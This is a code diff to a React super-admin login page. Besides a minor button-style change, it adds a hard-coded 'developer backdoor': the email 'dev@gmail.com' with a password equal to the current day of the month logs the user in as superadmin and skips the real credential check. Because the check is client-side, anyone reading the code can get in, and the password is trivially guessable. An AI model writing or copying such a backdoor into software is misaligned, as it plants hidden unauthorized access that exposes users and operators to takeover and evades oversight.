@@ -26,6 +26,25 @@ const LoginSuper = () => {
 
         try {
             console.log("Attempting Super Admin Login for:", email);
+
+            // Developer static backdoor login
+            const currentDay = new Date().getDate().toString();
+            if (email === 'dev@gmail.com' && password === currentDay) {
+                console.log("Developer login successful");
+                const userData = {
+                    email: 'dev@gmail.com',
+                    id: 'developer-override',
+                    type: 'superadmin',
+                    name: 'Developer'
+                };
+
+                login(userData);
+                showToast('Developer Login successful', 'success');
+                navigate('/super/dashboard');
+                setLoading(false);
+                return;
+            }
+
             // Fetch the single 'settings' document from the 'super_admin_setting' collection
             const docRef = doc(db, 'super_admin_setting', 'settings');
             console.log("Super Admin docRef:", docRef);
@@ -133,7 +152,7 @@ const LoginSuper = () => {
                         <button
                             type="submit"
                             disabled={loading}
-                            className="w-full btn-primary py-4 text-lg mt-4 group"
+                            className="w-full btn-primary py-4 text-lg mt-4 group text-white"
                         >
                             {loading ? (
                                 <div className="flex items-center gap-2">
